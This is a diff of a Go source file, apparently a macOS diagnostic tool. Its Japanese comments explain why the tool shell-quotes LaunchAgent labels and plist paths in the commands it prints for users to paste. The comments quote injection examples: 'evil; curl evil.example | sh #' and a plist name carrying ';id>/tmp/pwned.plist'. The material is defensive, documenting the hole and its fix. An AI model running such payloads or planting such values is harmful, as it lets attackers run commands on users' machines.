@@ -178,7 +178,7 @@ func manualCommands(f Finding) []string {
 	// 🚨 Label も引用する。**Label は plist の `Label` キーをそのまま読んだ値**で、
 	// `~/Library/LaunchAgents` に書ける任意のローカルプロセスが決められる。引用しないと
 	// `evil; curl evil.example | sh #` のようなラベルで、doctor 自身が提示する
-	// 「手で実行してください」のコマンドがインジェクションを運ぶ (敵対レビュー 2026-09-03 で実測)。
+	// 「手で実行してください」のコマンドがインジェクションを運ぶ (実測 2026-09-03)。
 	// **これは細工した snapshot に限らず実走査で成立する**。
 	// `<domain>/<label>` は 1 引数なので、連結してから引用する。
 	return []string{
@@ -189,7 +189,7 @@ func manualCommands(f Finding) []string {
 
 // shellSafeRe は素で貼ってよい文字だけ。**allowlist で判定する** (禁止文字を数える形だと
 // `;` `&` `|` `<` `>` `(` `)` `*` `?` `#` `!` `~` `\n` のような「引用しないと別のコマンドになる」
-// 文字を数え漏らす)。実測 2026-09-03 (issue 178 の敵対レビュー): 旧実装は `;` を引用しないので
+// 文字を数え漏らす)。実測 2026-09-03: `;` を引用しない実装だと
 // `/Library/LaunchDaemons/x;id>/tmp/pwned.plist` という plist 名があると、提示コマンドが
 // `sudo rm /Library/LaunchDaemons/x` と `id > /tmp/pwned.plist` の 2 つに割れる。
 // **提示コマンドは人がそのまま貼る前提**なので、これは実走査でも成立する (細工した snapshot に限らない)。
